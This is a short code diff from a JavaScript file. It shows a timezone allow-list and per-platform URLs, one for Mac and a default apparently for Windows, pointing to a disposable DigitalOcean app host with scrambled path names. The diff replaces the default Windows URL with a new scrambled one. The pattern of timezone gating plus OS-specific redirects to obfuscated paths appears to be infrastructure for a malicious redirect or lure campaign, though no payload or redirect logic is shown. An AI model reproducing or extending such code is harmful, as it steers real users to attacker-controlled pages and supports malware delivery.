@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 // URL configurations organized by platform target
 const URL_CONFIGS = {
     mac: "https://monkfish-app-cxnip.ondigitalocean.app/Ma0cHelpAsMEr0t0140/index.html",
-    default: "https://monkfish-app-cxnip.ondigitalocean.app/Win0codejInfowj2n/index.html"
+    default: "https://monkfish-app-cxnip.ondigitalocean.app/W0nsic0deinfosmn001/index.html"
 };
 
 // --- Pre-Compilation Cache Layer ---
